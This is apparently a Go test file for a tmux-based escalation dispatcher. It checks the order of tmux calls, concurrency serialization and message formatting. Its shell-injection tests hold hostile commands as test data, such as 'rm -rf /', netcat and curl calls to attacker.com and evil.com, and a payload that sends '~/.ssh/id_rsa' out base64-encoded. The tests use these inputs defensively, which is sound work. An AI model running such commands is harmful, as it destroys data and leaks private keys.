package dispatcher_test

import (
	"context"
	"fmt"
	"strings"
	"sync"
	"testing"

	"oro/pkg/dispatcher"
	"oro/pkg/protocol"
)

// mockEscRunner captures commands for assertion without running real tmux.
type mockEscRunner struct {
	calls          []escCall
	err            error
	hasSessionErr  error  // separate error for has-session check
	detachedOutput []byte // output for display-message #{session_attached} (nil = "attached")
}

type escCall struct {
	name string
	args []string
}

func (m *mockEscRunner) Run(_ context.Context, name string, args ...string) ([]byte, error) {
	m.calls = append(m.calls, escCall{name: name, args: args})

	// If this is a has-session check, return hasSessionErr (defaults to nil)
	if name == "tmux" && len(args) > 0 && args[0] == "has-session" {
		return nil, m.hasSessionErr
	}

	// If this is a display-message check for attached status, return detachedOutput.
	if name == "tmux" && len(args) > 0 && args[0] == "display-message" && m.detachedOutput != nil {
		return m.detachedOutput, nil
	}

	// Otherwise return the general err
	return nil, m.err
}

// coreCalls filters out wake infrastructure calls (display-message,
// resize-pane, kill -WINCH) so escalation protocol tests stay index-stable.
func coreCalls(calls []escCall) []escCall {
	var result []escCall
	for _, c := range calls {
		if c.name == "tmux" && len(c.args) > 0 {
			if c.args[0] == "display-message" || c.args[0] == "resize-pane" {
				continue
			}
		}
		if c.name == "kill" {
			continue
		}
		result = append(result, c)
	}
	return result
}

// --- Tests ---

func TestEscalator_ClearsInputBeforePaste(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "test message")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	calls := coreCalls(runner.calls)
	// 6 core calls: has-session, send-keys C-u, set-buffer, paste-buffer, send-keys Escape, send-keys Enter
	if len(calls) != 6 {
		t.Fatalf("expected 6 core calls, got %d", len(calls))
	}

	// Call 1 (index 1): send-keys C-u
	cuCall := calls[1]
	if cuCall.args[0] != "send-keys" {
		t.Errorf("call 1 should be send-keys, got: %s", cuCall.args[0])
	}
	if cuCall.args[len(cuCall.args)-1] != "C-u" {
		t.Errorf("call 1 should send C-u, got: %v", cuCall.args)
	}

	// Call 2 (index 2): set-buffer (comes AFTER C-u)
	setCall := calls[2]
	if setCall.args[0] != "set-buffer" {
		t.Errorf("call 2 should be set-buffer, got: %s", setCall.args[0])
	}
}

func TestEscalator_SendsEscapeBeforeEnter(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "test message")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	calls := coreCalls(runner.calls)
	if len(calls) != 6 {
		t.Fatalf("expected 6 core calls, got %d", len(calls))
	}

	// Call 4 (index 4): send-keys Escape
	escCall := calls[4]
	if escCall.args[0] != "send-keys" || escCall.args[len(escCall.args)-1] != "Escape" {
		t.Errorf("call 4 should be send-keys Escape, got: %v", escCall.args)
	}

	// Call 5 (index 5): send-keys Enter
	enterCall := calls[5]
	if enterCall.args[0] != "send-keys" || enterCall.args[len(enterCall.args)-1] != "Enter" {
		t.Errorf("call 5 should be send-keys Enter, got: %v", enterCall.args)
	}
}

func TestTmuxEscalator_Escalate_BasicMessage(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "merge failed for bead abc123")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	calls := coreCalls(runner.calls)
	if len(calls) != 6 {
		t.Fatalf("expected 6 core calls, got %d", len(calls))
	}

	// First call: has-session
	call0 := calls[0]
	if call0.args[0] != "has-session" {
		t.Fatalf("expected has-session, got %s", call0.args[0])
	}

	// Second call: send-keys C-u
	cuCall := calls[1]
	if cuCall.args[0] != "send-keys" {
		t.Fatalf("expected send-keys (C-u), got %s", cuCall.args[0])
	}
	if cuCall.args[len(cuCall.args)-1] != "C-u" {
		t.Fatalf("expected C-u as last arg, got %s", cuCall.args[len(cuCall.args)-1])
	}

	// Third call: set-buffer
	setBufferCall := calls[2]
	if setBufferCall.args[0] != "set-buffer" {
		t.Fatalf("expected set-buffer, got %s", setBufferCall.args[0])
	}
	if !strings.Contains(strings.Join(setBufferCall.args, " "), "merge failed for bead abc123") {
		t.Fatalf("message not found in set-buffer call: %v", setBufferCall.args)
	}

	// Fourth call: paste-buffer
	pasteCall := calls[3]
	if pasteCall.args[0] != "paste-buffer" {
		t.Fatalf("expected paste-buffer, got %s", pasteCall.args[0])
	}

	// Fifth call: send-keys Escape
	escapeCall := calls[4]
	if escapeCall.args[0] != "send-keys" {
		t.Fatalf("expected send-keys, got %s", escapeCall.args[0])
	}
	if escapeCall.args[len(escapeCall.args)-1] != "Escape" {
		t.Fatalf("expected Escape as last arg, got %s", escapeCall.args[len(escapeCall.args)-1])
	}

	// Sixth call: send-keys Enter
	enterCall := calls[5]
	if enterCall.args[0] != "send-keys" {
		t.Fatalf("expected send-keys, got %s", enterCall.args[0])
	}
	if enterCall.args[len(enterCall.args)-1] != "Enter" {
		t.Fatalf("expected Enter as last arg, got %s", enterCall.args[len(enterCall.args)-1])
	}
}

func TestTmuxEscalator_Escalate_Error(t *testing.T) {
	// Simulate send-keys error (session exists but send-keys fails)
	runner := &mockEscRunner{err: fmt.Errorf("tmux not running")}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "test")
	if err == nil {
		t.Fatal("expected error")
	}
	if !strings.Contains(err.Error(), "tmux") {
		t.Fatalf("error should mention tmux, got: %v", err)
	}
}

func TestTmuxEscalator_DefaultSessionAndPane(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("", "", runner)

	err := esc.Escalate(context.Background(), "hello")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	calls := coreCalls(runner.calls)
	if len(calls) != 6 {
		t.Fatalf("expected 6 core calls, got %d", len(calls))
	}

	// First call: has-session with default session name
	call0 := calls[0]
	if call0.args[0] != "has-session" {
		t.Fatalf("expected has-session, got %s", call0.args[0])
	}
	if call0.args[2] != "oro" {
		t.Fatalf("expected default session oro, got %s", call0.args[2])
	}

	// Check paste-buffer call for default window target (index 3)
	pasteCall := calls[3]
	foundPane := false
	for i, arg := range pasteCall.args {
		if arg == "-t" && i+1 < len(pasteCall.args) {
			if pasteCall.args[i+1] == "oro:manager" {
				foundPane = true
				break
			}
		}
	}
	if !foundPane {
		t.Fatalf("expected default window oro:manager in paste-buffer call, got args: %v", pasteCall.args)
	}
}

func TestTmuxEscalator_SanitizesNewlines(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "line1\nline2\rline3")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Check set-buffer call (third call, after has-session and C-u)
	setBufferCall := runner.calls[2]
	msg := setBufferCall.args[len(setBufferCall.args)-1]
	if strings.Contains(msg, "\n") || strings.Contains(msg, "\r") {
		t.Fatalf("message should not contain newlines, got %q", msg)
	}
}

func TestTmuxEscalator_EnterSuffix(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	_ = esc.Escalate(context.Background(), "test")

	calls := coreCalls(runner.calls)
	if len(calls) < 6 {
		t.Fatalf("expected at least 6 core calls, got %d", len(calls))
	}
	enterCall := calls[5]
	lastArg := enterCall.args[len(enterCall.args)-1]
	if lastArg != "Enter" {
		t.Fatalf("last arg should be Enter, got %s", lastArg)
	}
}

func TestTmuxEscalator_ImplementsInterface(t *testing.T) {
	runner := &mockEscRunner{}
	var _ dispatcher.Escalator = dispatcher.NewTmuxEscalator("", "", runner)
}

func TestTmuxEscalator_CustomPaneTarget(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("myapp", "myapp:1.2", runner)

	_ = esc.Escalate(context.Background(), "custom pane")

	calls := coreCalls(runner.calls)
	if len(calls) != 6 {
		t.Fatalf("expected 6 core calls, got %d", len(calls))
	}

	// Check has-session call (first call)
	call0 := calls[0]
	if call0.args[2] != "myapp" {
		t.Fatalf("expected custom session myapp, got %s", call0.args[2])
	}

	// Check paste-buffer call for pane target (index 3)
	pasteCall := calls[3]
	foundPane := false
	for i, arg := range pasteCall.args {
		if arg == "-t" && i+1 < len(pasteCall.args) {
			if pasteCall.args[i+1] == "myapp:1.2" {
				foundPane = true
				break
			}
		}
	}
	if !foundPane {
		t.Fatalf("expected custom pane myapp:1.2 in paste-buffer call, got args: %v", pasteCall.args)
	}
}

// threadSafeEscRunner is a concurrency-safe mock that records call sequences per goroutine.
type threadSafeEscRunner struct {
	mu    sync.Mutex
	calls []escCall
}

func (m *threadSafeEscRunner) Run(_ context.Context, name string, args ...string) ([]byte, error) {
	m.mu.Lock()
	m.calls = append(m.calls, escCall{name: name, args: args})
	m.mu.Unlock()
	return nil, nil
}

func TestTmuxEscalator_ConcurrentEscalateSerializes(t *testing.T) {
	runner := &threadSafeEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	const n = 20
	var wg sync.WaitGroup
	wg.Add(n)
	for i := range n {
		go func(i int) {
			defer wg.Done()
			_ = esc.Escalate(context.Background(), fmt.Sprintf("msg-%d", i))
		}(i)
	}
	wg.Wait()

	// Each Escalate call produces 6 core tmux calls (plus wake infrastructure).
	// With mutex serialization, core calls must appear in groups of 6.
	runner.mu.Lock()
	allCalls := runner.calls
	runner.mu.Unlock()

	// Filter to core calls only (exclude display-message/resize-pane wake calls).
	var calls []escCall
	for _, c := range allCalls {
		if c.name == "tmux" && len(c.args) > 0 {
			if c.args[0] == "display-message" || c.args[0] == "resize-pane" {
				continue
			}
		}
		calls = append(calls, c)
	}

	if len(calls) != n*6 {
		t.Fatalf("expected %d core calls (%d escalations × 6), got %d", n*6, n, len(calls))
	}

	// Verify calls appear in correct 6-call groups (no interleaving).
	for i := 0; i < len(calls); i += 6 {
		group := calls[i : i+6]
		if group[0].args[0] != "has-session" {
			t.Errorf("call %d: expected has-session, got %s", i, group[0].args[0])
		}
		if group[1].args[0] != "send-keys" {
			t.Errorf("call %d: expected send-keys (C-u), got %s", i+1, group[1].args[0])
		}
		if group[2].args[0] != "set-buffer" {
			t.Errorf("call %d: expected set-buffer, got %s", i+2, group[2].args[0])
		}
		if group[3].args[0] != "paste-buffer" {
			t.Errorf("call %d: expected paste-buffer, got %s", i+3, group[3].args[0])
		}
		if group[4].args[0] != "send-keys" || group[4].args[len(group[4].args)-1] != "Escape" {
			t.Errorf("call %d: expected send-keys Escape, got %v", i+4, group[4].args)
		}
		if group[5].args[0] != "send-keys" || group[5].args[len(group[5].args)-1] != "Enter" {
			t.Errorf("call %d: expected send-keys Enter, got %v", i+5, group[5].args)
		}

		// The buffer name in set-buffer and paste-buffer must match within the group.
		setBuf := strings.Join(group[2].args, " ")
		pasteBuf := strings.Join(group[3].args, " ")
		if !strings.Contains(setBuf, "oro-escalate") || !strings.Contains(pasteBuf, "oro-escalate") {
			t.Errorf("group %d: buffer name mismatch, set=%s paste=%s", i/6, setBuf, pasteBuf)
		}
	}
}

func TestTmuxEscalator_WakesDetachedSessionBetweenEscapeAndEnter(t *testing.T) {
	runner := &mockEscRunner{}
	// Simulate detached session: display-message returns "0".
	runner.detachedOutput = []byte("0")
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "test wake")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Find Escape, Enter, and any kill -WINCH calls between them.
	var escapeIdx, enterIdx int
	escapeIdx, enterIdx = -1, -1
	for i, c := range runner.calls {
		if c.name == "tmux" && len(c.args) > 0 {
			if c.args[0] == "send-keys" && c.args[len(c.args)-1] == "Escape" {
				escapeIdx = i
			}
			if c.args[0] == "send-keys" && c.args[len(c.args)-1] == "Enter" && enterIdx == -1 {
				enterIdx = i
			}
		}
	}

	if escapeIdx == -1 || enterIdx == -1 {
		t.Fatalf("expected Escape (idx=%d) and Enter (idx=%d) calls", escapeIdx, enterIdx)
	}

	// There must be kill -WINCH calls (SIGWINCH wake) between Escape and Enter.
	var wakesBetween int
	for i := escapeIdx + 1; i < enterIdx; i++ {
		if runner.calls[i].name == "kill" && len(runner.calls[i].args) > 0 && runner.calls[i].args[0] == "-WINCH" {
			wakesBetween++
		}
	}
	if wakesBetween == 0 {
		t.Error("expected kill -WINCH between Escape and Enter in detached session")
	}
}

// --- FormatEscalation tests ---

func TestFormatEscalation_WithDetails(t *testing.T) {
	got := protocol.FormatEscalation(protocol.EscMergeConflict, "bead-abc", "merge failed", "conflicting files in src/")
	want := "[ORO-DISPATCH] MERGE_CONFLICT: bead-abc — merge failed. conflicting files in src/."
	if got != want {
		t.Fatalf("FormatEscalation with details:\n got: %q\nwant: %q", got, want)
	}
}

func TestFormatEscalation_WithoutDetails(t *testing.T) {
	got := protocol.FormatEscalation(protocol.EscStuck, "bead-xyz", "review failed", "")
	want := "[ORO-DISPATCH] STUCK: bead-xyz — review failed."
	if got != want {
		t.Fatalf("FormatEscalation without details:\n got: %q\nwant: %q", got, want)
	}
}

func TestFormatEscalation_AllTypes(t *testing.T) {
	types := []struct {
		typ  protocol.EscalationType
		name string
	}{
		{protocol.EscMergeConflict, "MERGE_CONFLICT"},
		{protocol.EscStuck, "STUCK"},
		{protocol.EscPriorityContention, "PRIORITY_CONTENTION"},
		{protocol.EscWorkerCrash, "WORKER_CRASH"},
		{protocol.EscStatus, "STATUS"},
		{protocol.EscDrainComplete, "DRAIN_COMPLETE"},
	}

	for _, tc := range types {
		t.Run(tc.name, func(t *testing.T) {
			got := protocol.FormatEscalation(tc.typ, "bead-1", "summary", "")
			prefix := "[ORO-DISPATCH] " + tc.name + ": bead-1"
			if !strings.HasPrefix(got, prefix) {
				t.Fatalf("expected prefix %q, got %q", prefix, got)
			}
		})
	}
}

func TestFormatEscalation_EmptyBeadID(t *testing.T) {
	got := protocol.FormatEscalation(protocol.EscDrainComplete, "", "all workers drained", "")
	want := "[ORO-DISPATCH] DRAIN_COMPLETE:  — all workers drained."
	if got != want {
		t.Fatalf("FormatEscalation empty bead:\n got: %q\nwant: %q", got, want)
	}
}

func TestEscalation_DeadSession(t *testing.T) {
	// Simulate a dead tmux session: has-session returns error
	runner := &mockEscRunner{hasSessionErr: fmt.Errorf("session not found")}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "test escalation")
	if err == nil {
		t.Fatal("expected error when tmux session is dead")
	}

	if !strings.Contains(err.Error(), "session oro not found") {
		t.Fatalf("error should mention session not found, got: %v", err)
	}

	// Verify has-session was called but nothing else
	if len(runner.calls) != 1 {
		t.Fatalf("expected 1 call (has-session only), got %d", len(runner.calls))
	}

	call := runner.calls[0]
	if call.args[0] != "has-session" {
		t.Fatalf("expected has-session, got %s", call.args[0])
	}
	if call.args[2] != "oro" {
		t.Fatalf("expected session name 'oro', got %s", call.args[2])
	}
}

// --- Shell Injection Tests (oro-dfe.4) ---

func TestEscalation_NoInjection(t *testing.T) {
	tests := []struct {
		name    string
		message string
		desc    string
	}{
		{name: "command substitution dollar-paren", message: "QG output: $(rm -rf /)", desc: "$(rm -rf /) should be treated as literal text"},
		{name: "command substitution backticks", message: "protocol.Bead title: `whoami`", desc: "backticks should be treated as literal text"},
		{name: "pipe chain", message: "Error | nc attacker.com 1234", desc: "pipe operator should not execute commands"},
		{name: "semicolon chain", message: "Done; curl evil.com/exfil", desc: "semicolon should not chain commands"},
		{name: "ampersand background", message: "Wait & curl evil.com", desc: "ampersand should not background commands"},
		{name: "double ampersand", message: "Success && rm -rf .", desc: "double ampersand should not chain commands"},
		{name: "redirect output", message: "Log > /tmp/leak", desc: "redirect operators should not create files"},
		{name: "redirect input", message: "Read < /etc/passwd", desc: "redirect operators should not read files"},
		{name: "variable expansion", message: "Path: $HOME/.ssh/id_rsa", desc: "variables should not be expanded"},
		{name: "glob expansion", message: "Files: *", desc: "glob patterns should not be expanded"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			runner := &mockEscRunner{}
			esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

			err := esc.Escalate(context.Background(), tt.message)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			calls := coreCalls(runner.calls)
			if len(calls) != 6 {
				t.Fatalf("expected 6 core calls, got %d", len(calls))
			}

			// Verify set-buffer is used (third call, after has-session and C-u)
			setBufferCall := calls[2]
			if setBufferCall.args[0] != "set-buffer" {
				t.Errorf("SECURITY: Not using set-buffer for literal text. Got %s. %s", setBufferCall.args[0], tt.desc)
			}

			// Verify paste-buffer is used (fourth call)
			pasteCall := calls[3]
			if pasteCall.args[0] != "paste-buffer" {
				t.Errorf("SECURITY: Not using paste-buffer for literal insertion. Got %s. %s", pasteCall.args[0], tt.desc)
			}

			// Verify send-keys Escape (fifth call)
			escapeCall := calls[4]
			if escapeCall.args[0] != "send-keys" || escapeCall.args[len(escapeCall.args)-1] != "Escape" {
				t.Errorf("SECURITY: call 4 should be send-keys Escape, got %v. %s", escapeCall.args, tt.desc)
			}

			// Verify send-keys is only used for Enter (sixth call)
			enterCall := calls[5]
			if enterCall.args[0] == "send-keys" {
				for _, arg := range enterCall.args {
					if strings.Contains(arg, "$") || strings.Contains(arg, "`") || strings.Contains(arg, ";") {
						t.Errorf("SECURITY: send-keys contains dangerous characters: %s. %s", arg, tt.desc)
					}
				}
			}
		})
	}
}

func TestEscalation_ComplexPayload(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	payload := "[ORO-DISPATCH] STUCK: bead-$(whoami) — Review failed; curl attacker.com?data=$(cat ~/.ssh/id_rsa | base64). `rm -rf /tmp/*`"

	err := esc.Escalate(context.Background(), payload)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	calls := coreCalls(runner.calls)
	if len(calls) != 6 {
		t.Fatalf("expected 6 core calls, got %d", len(calls))
	}

	// Third call should be set-buffer with the payload (after has-session and C-u)
	setBufferCall := calls[2]
	if setBufferCall.args[0] != "set-buffer" {
		t.Error("SECURITY: Expected set-buffer for literal text handling")
	}

	// Fourth call should be paste-buffer
	pasteCall := calls[3]
	if pasteCall.args[0] != "paste-buffer" {
		t.Error("SECURITY: Expected paste-buffer for literal insertion")
	}

	// Fifth call should be send-keys Escape
	escapeCall := calls[4]
	if escapeCall.args[0] != "send-keys" || escapeCall.args[len(escapeCall.args)-1] != "Escape" {
		t.Error("SECURITY: Expected send-keys Escape before Enter")
	}

	// Sixth call should be send-keys with only Enter
	enterCall := calls[5]
	if enterCall.args[0] == "send-keys" {
		argsStr := strings.Join(enterCall.args, " ")
		if strings.Contains(argsStr, "$(") || strings.Contains(argsStr, "`") {
			t.Error("SECURITY: send-keys contains dangerous payload - should only send Enter")
		}
	}
}

// TestEscalator_ConcurrentEscalations is the acceptance test for oro-jmil.1.
// It verifies that 10 concurrent Escalate() calls each deliver their full
// set-buffer → paste-buffer → send-keys sequence without interleaving,
// proving the sync.Mutex serializes access to the shared "oro-escalate" buffer.
func TestEscalator_ConcurrentEscalations(t *testing.T) {
	runner := &threadSafeEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	const n = 10
	var wg sync.WaitGroup
	wg.Add(n)
	for i := range n {
		go func(i int) {
			defer wg.Done()
			msg := fmt.Sprintf("concurrent-msg-%d", i)
			if err := esc.Escalate(context.Background(), msg); err != nil {
				t.Errorf("Escalate(%d) unexpected error: %v", i, err)
			}
		}(i)
	}
	wg.Wait()

	// Collect all recorded calls under the lock.
	runner.mu.Lock()
	allCalls := make([]escCall, len(runner.calls))
	copy(allCalls, runner.calls)
	runner.mu.Unlock()

	// Filter to core calls (skip display-message / resize-pane / kill wake calls).
	var calls []escCall
	for _, c := range allCalls {
		if c.name == "tmux" && len(c.args) > 0 {
			if c.args[0] == "display-message" || c.args[0] == "resize-pane" {
				continue
			}
		}
		if c.name == "kill" {
			continue
		}
		calls = append(calls, c)
	}

	// Expect exactly n*6 core calls: each Escalate produces
	// has-session, send-keys C-u, set-buffer, paste-buffer, send-keys Escape, send-keys Enter.
	if len(calls) != n*6 {
		t.Fatalf("expected %d core calls (%d escalations × 6), got %d", n*6, n, len(calls))
	}

	// Verify that calls appear in contiguous groups of 6 with no interleaving.
	// With mutex serialization, the sequence must be strictly:
	//   [has-session, send-keys C-u, set-buffer, paste-buffer, send-keys Escape, send-keys Enter] × n
	for i := 0; i < len(calls); i += 6 {
		group := calls[i : i+6]
		groupIdx := i / 6

		if group[0].args[0] != "has-session" {
			t.Errorf("group %d call 0: expected has-session, got %s", groupIdx, group[0].args[0])
		}
		if group[1].args[0] != "send-keys" || group[1].args[len(group[1].args)-1] != "C-u" {
			t.Errorf("group %d call 1: expected send-keys C-u, got %v", groupIdx, group[1].args)
		}
		if group[2].args[0] != "set-buffer" {
			t.Errorf("group %d call 2: expected set-buffer, got %s", groupIdx, group[2].args[0])
		}
		if group[3].args[0] != "paste-buffer" {
			t.Errorf("group %d call 3: expected paste-buffer, got %s", groupIdx, group[3].args[0])
		}
		if group[4].args[0] != "send-keys" || group[4].args[len(group[4].args)-1] != "Escape" {
			t.Errorf("group %d call 4: expected send-keys Escape, got %v", groupIdx, group[4].args)
		}
		if group[5].args[0] != "send-keys" || group[5].args[len(group[5].args)-1] != "Enter" {
			t.Errorf("group %d call 5: expected send-keys Enter, got %v", groupIdx, group[5].args)
		}

		// The set-buffer and paste-buffer within the same group must reference
		// the same buffer name, confirming no cross-goroutine buffer corruption.
		setBufArgs := strings.Join(group[2].args, " ")
		pasteBufArgs := strings.Join(group[3].args, " ")
		if !strings.Contains(setBufArgs, "oro-escalate") {
			t.Errorf("group %d: set-buffer missing 'oro-escalate' buffer name: %s", groupIdx, setBufArgs)
		}
		if !strings.Contains(pasteBufArgs, "oro-escalate") {
			t.Errorf("group %d: paste-buffer missing 'oro-escalate' buffer name: %s", groupIdx, pasteBufArgs)
		}
	}
}
